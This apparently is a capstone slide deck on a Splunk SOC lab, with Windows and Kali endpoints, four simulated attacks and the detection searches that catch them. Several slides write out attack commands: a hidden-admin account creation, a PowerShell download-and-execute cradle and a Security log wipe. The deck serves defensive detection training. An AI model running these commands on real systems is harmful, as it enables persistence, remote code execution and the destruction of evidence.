# SOC Playground — Project 3: SIEM Deployment

---

## Slide 1: Title Slide

**Project 3: SIEM Deployment**
SOC Playground — A Reproducible SOC Laboratory
Splunk Enterprise | Windows 11 | Kali Linux
Capstone Presentation

---

## Slide 2: Agenda

1. Project Overview
2. Architecture
3. Splunk Manager Setup
4. Windows Endpoint Configuration
5. Kali Endpoint Configuration
6. Attack Simulations (Attk101–104)
7. Detection Engineering
8. SignalScope Console
9. Results & Demo
10. Lessons Learned

---

## Slide 3: Project Overview

**Objective**
Build a fully functional SOC from scratch using Splunk Enterprise as the SIEM platform.

**Scope**
- 1 macOS SIEM manager
- 2 monitored endpoints (Windows + Kali)
- 4 simulated attacks mapped to detection rules
- Real-time visualization console

**Key Requirement**
All infrastructure must be code-driven and repeatable via a public repository.

---

## Slide 4: Architecture

```
┌────────────────────────────────────────────────────┐
│  macOS Host (192.168.64.1)                         │
│  Splunk Enterprise 10.2.6                          │
│  :8000 Web   :9997 Receive   :8089 Mgmt            │
│  SignalScope Console (:8765)                        │
└──┬────────────────────────────────┬────────────────┘
   │ TCP 9997                       │ TCP 9997
┌──▼──────────────────┐  ┌──────────▼──────────────┐
│ Windows 11 (.64.2)  │  │  Kali Linux (.64.4)     │
│ Sysmon + UF         │  │  UF → auth.log + syslog │
│ Security/System/App │  │  Attack origin           │
└─────────────────────┘  └─────────────────────────┘
```

---

## Slide 5: Splunk Manager Setup

**Host:** macOS, native Splunk Enterprise 10.2.6

**Scripted via** `setup-splunk-macos.sh`:
- Password initialization (user-seed.conf)
- Receiver port 9997
- Dedicated `soc_capstone` index
- LaunchAgent auto-start
- Firewall exceptions

**Why dedicated index:**
- Evidence isolation
- Independent retention
- Per-index RBAC
- Cleaner searches

---

## Slide 6: Windows Endpoint

**VM:** Windows 11, 192.168.64.2

**Sysmon + SwiftOnSecurity Config**
- 300+ high-signal rules
- Process command lines, network connections, file events
- De-facto SOC standard

**Splunk Universal Forwarder**
- Silent msiexec install
- Service runs as LocalSystem (resolved EID 1102 ACL)
- Forwards: Security, System, Application, Sysmon Operational

**Keys:** Outbound firewall for 9997, ProtonVPN disconnected

---

## Slide 7: Kali Linux Endpoint

**VM:** Kali Linux, 192.168.64.4

**rsyslog** (Kali uses journald by default)
- Installed to produce `/var/log/auth.log` and `/var/log/syslog`

**Splunk Universal Forwarder** (.deb amd64)
- `splunkfwd` user added to `adm` group for read access
- Systemd-managed service

**Forwards:**
- `auth.log` as `linux_secure`
- `syslog` as `syslog`

---

## Slide 8: Attack Simulations Overview

| ID | Technique | Target | Detection |
|----|-----------|--------|-----------|
| Attk101 | SSH password brute force | Kali (.4) | auth.log Failed password |
| Attk102 | Hidden local admin | Windows (.2) | Sec EID 4720/4732 |
| Attk103 | PowerShell download-exec | Windows (.2) | Sysmon EID 1/3 |
| Attk104 | Clear Security log | Windows (.2) | Sec EID 1102 |

All attacks are timestamped, logged, and reproducible via single commands.

---

## Slide 9: Attk101 — SSH Brute Force

**Script:** `Attk101_psuedoattacks.py` (paramiko)

**Execution:**
- 15 password attempts against Kali SSH
- 14 failures, 1 success (correct credential)
- 1.5s delay between attempts

**Evidence in Splunk:**
- 15 `linux_secure` events with `Failed password` / `Accepted password`
- Source IP logged per attempt

**Timeline:**
```
[Attk101] FAIL attempt=1-14 user=medusa
[Attk101] SUCCESS attempt=15 credential_valid=true
```

---

## Slide 10: Attk102 — Hidden Local Admin

**Script:** `Attk102_psuedoattacks.ps1`

**Execution:**
- `net user playadmin Capstone2026! /add`
- `net localgroup Administrators playadmin /add`

**Evidence in Splunk:**
- Security EID 4720 (local account created)
- Security EID 4732 (member added to Administrators)

**Detection:** Account change detection fires.

---

## Slide 11: Attk103 — PowerShell Stager

**Script:** `Attk103_psuedoattacks.ps1`

**Execution:**
- Benign payload hosted on Mac Splunk Web server
- `IEX (New-Object Net.WebClient).DownloadString(url)` on Windows
- Payload prints marker: `SOC_CAPSTONE_BENIGN_PAYLOAD_EXECUTED_*`

**Evidence in Splunk:**
- Sysmon EID 1: `powershell.exe` with `DownloadString` in cmdline
- Sysmon EID 3: Network connect to Mac port 8000

---

## Slide 12: Attk104 — Log Wipe (Documented)

**Script:** `Attk104_psuedoattacks.ps1`

**Technique:** Defense Evasion — clear Windows Security log

**Command:** `wevtutil cl Security`

**Detection:** Security EID 1102 (audit log cleared) + Sysmon EID 4

**Note:** Not executed during the live demo; requires prior evidence export.

---

## Slide 13: Detection Searches

7 SPL saved searches deployed as the `soc_capstone_detections` app:

| Search | What it detects |
|--------|----------------|
| Attk101 SSH Password Attempts (Linux) | auth.log Failed password, grouped by src, threshold 10 |
| Attk101 Windows Failed Logons (4625) | Security EID 4625, grouped by IP |
| Attk102 Local Account Created | Security EID 4720 |
| Attk102 Account Added to Admins | Security EID 4728/4732/4738 |
| Attk103 PowerShell Download Cradle | Sysmon EID 1 + DownloadString/Invoke-WebRequest |
| Attk103 Network Connect From PowerShell | Sysmon EID 3 + powershell.exe |
| Attk104 Security Log Cleared | Security EID 1102 / Sysmon EID 4 |

---

## Slide 14: Splunk Dashboard

**Dashboard:** `SOC Playground — Attack Detection Dashboard`

**9 panels:**
- SSH brute force (Linux + Windows)
- Account creation + admin group changes
- PowerShell download cradles + network connects
- Log clearing events
- Proof of ingestion (events by sourcetype)
- Forwarder health (events by host over time)

**Deployment:** Automatically imported via `05-detection/deploy-macos.sh`

---

## Slide 15: SignalScope Console

**URL:** `http://127.0.0.1:8765` (loopback only)

**Architecture:**
- Python `http.server` bridge (no external deps)
- Queries Splunk REST API every 5 seconds
- Renders Canvas-based waveform

**Features:**
- Smoothed 60-bin density waveform
- Mirrored envelopes per technique
- Vertical capture threads with glow
- Hover inspection with event counts
- Detection cards with severity coding
- Auto-scrolls continuously at real clock speed

---

## Slide 16: Live Results

During the demo window (1 hour):

| Metric | Value |
|--------|-------|
| Total matching events | 18 |
| Active detections | 3 |
| Hosts monitored | 2 |
| Peak density | 14 events/min (SSH burst) |

**Detection breakdown:**
- Attk101 SSH brute force: 15 events, burst detection triggered
- Attk102 Local admin: 2 events, account change triggered
- Attk103 PowerShell download: 1 event, download detected

---

## Slide 17: Repository Structure

**GitHub:** `github.com/YeandAmen/SOC-Playground`

| Directory | Contents |
|-----------|----------|
| `01-splunk-manager/` | macOS Splunk setup script + docs |
| `02-windows-endpoint/` | Sysmon/UF installers + inputs.conf |
| `03-linux-endpoint/` | Kali UF installer |
| `04-attacks/` | Attk101–111 simulation scripts |
| `05-detection/` | Saved searches + dashboard XML |
| `06-deliverables/` | Architecture, mapping, report template |
| `07-live-console/` | SignalScope app (SignalScope server + JS UI) |

---

## Slide 18: Conclusion & Lessons Learned

**What worked well:**
- Code-driven setup: all components reproducible
- Dedicated index: clean evidence isolation
- SwiftOnSecurity Sysmon config: high-signal telemetry
- SignalScope: real-time visualization with no external deps

**Challenges resolved:**
- macOS Application Firewall blocking receiver port → pf rule
- ProtonVPN full-tunnel on Windows intercepting UF traffic → disconnect VPN
- Sysmon ACL errorCode=5 → UF service changed to LocalSystem
- Kali missing rsyslog → installed + splunkfwd added to adm group

**Future improvements:**
- Automate Windows SSH reliability
- Add correlation rules (brute force → successful logon = critical)
- Expand to Linux-only forwarder (no dependency on journald→rsyslog)
- Document free SSH tunnel viewing for remote access